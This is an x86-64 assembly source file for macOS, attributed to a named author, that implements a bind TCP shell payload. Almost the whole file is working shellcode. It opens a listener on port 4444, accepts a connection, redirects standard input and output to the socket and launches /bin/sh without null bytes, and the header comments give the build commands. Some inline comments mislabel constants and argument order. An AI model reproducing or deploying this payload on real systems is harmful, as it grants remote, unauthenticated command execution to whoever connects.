;OSX intel x64 bind tcp shell
;Jacob Hammack
;jacob.hammack@hammackj.com
;http://www.hammackj.com
;
;
;/opt/local/bin/nasm -f macho64 bind_tcp.s -o bind_tcp.o
;ld -arch x86_64 bind_tcp.o -o bind_shell
;
;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_tcp -e start reverse_tcp.o

BITS 64

section .text
global start

start:
	mov r8b, 0x02									; unix class system calls = 2
	shl r8, 24										; shift left 24 to the upper order bits
	or r8, 0x61										; socket is 0x61 == 91
	mov rax, r8										; put socket syscall # into rax

;Socket syscall 97
	xor rdx, rdx									; zero out rdx
	mov rsi, rdx									; AF_NET = 1
	inc rsi												; rsi = AF_NET
	mov rdi, rsi									; SOCK_STREAM = 2
	inc rdi												; rdi = SOCK_STREAM
	syscall												; call socket(SOCK_STREAM, AF_NET, 0);

	mov r12, rax									; Save the socket

;Sock_addr
	;mov r13, 0xFFFFFFFF5C110101		; IP = FFFFFFFF, Port = 5C11(4444)
	;mov r13, 0x0345450A5C110101 	; IP = FFFFFFFF, Port = 5C11(4444)
	mov r13, 0x000000005C110101
	mov r9b, 0xFF									; The sock_addr_in is + FF from where we need it
	sub r13, r9										; So we sub 0xFF from it to get the correct value and avoid a null
	push r13											; Push it on the stack
	mov r13, rsp									; Save the sock_addr_in into r13

;bind
	add r8, 0x7										; Add 7 to r8 = 104(0x68)
	mov rax, r8										; puts 104 into rax
	mov rdi, r12									; Put the socket fd into rdi
	mov rsi, r13									; Put sock_addr_in into rsi
	xor rdx, rdx									; zero out rsi
	add rdx, 0x10									; Put size of sock_addr into
	syscall												; call bind(fd, sock_addr_in, 16)

;listen
	add r8, 0x2										; Add 2 to r8 = 106(0x6A)
	mov rax, r8										; Move 106 into rax
	mov rdi, r12									; Move the socket fd into rdi
	xor rsi, rsi									; zero out rsi
	add rsi, 0x5									; Add 5 to rsi for the backlog paramater
	syscall												; call listen(fd, 5)

;accept
	sub r8, 0x4C									; Subtract 76 from r8 = 30
	mov rax, r8										; Move 30 into rax
	mov rdi, r12									; Move the socket fd into rdi
	xor rsi, rsi									; Zero out rsi
	xor rdx, rdx									; Zero out rdx
	syscall												; call accept(fd, 0, 0)

	add r8, 0x1D									; Add 29 to r8 = 59(0x3b)

;exec
	mov rax, r8
	xor rdx, rdx									; zero out 3rd arg
	xor rsi, rsi									; zero out 2nd arg
	xor rdi, rdi									; zero out 1st arg
	syscall												; call execve(NULL,NULL,NULL)

	cmp rax, rdi									; compare rax to 0
	je predup												; jmp if = 0 and skip vfork

;rax = 0x3b = 59

;vfork
	sub r8, 0x11									; subtra	ct 17 from r8 = 0x42	
	mov rax, r8										; Move 42 into rax
	syscall												; call vfork();
	add r8, 0x30									; Add 0x30(48) to r8 = 90 (0x5A)
	jmp dup

predup:
	add r8, 0x1F									; Add 31 to r8 = 90

dup:
	mov rax, r8										; move the syscall for dup2 into rax
	mov rdi, r12									; move the FD for the socket into rdi
	syscall												; call dup2(rdi, rsi)

	cmp rsi, 0x2									; check to see if we are still under 2
	inc rsi												; inc rsi
	jbe dup												; jmp if less than 2

	sub r8, 0x1F									; setup the exec syscall at 0x3b
	mov rax, r8										; move the syscall into rax

;exec
	;sub r8, 0x37									; Subtract 90 - 31 = 59
	mov rax, r8										; Move 59 into rax
	xor rdx, rdx									; zero out rdx
	mov r13, 0x68732f6e69622fFF 	; '/bin/sh' in hex
	shr r13, 8										; shift right to create the null terminator
	push r13											; push to the stack
	mov rdi, rsp									; move the command from the stack to rdi
	xor rsi, rsi									; zero out rsi
	syscall												; call exec(rdi, 0, 0)
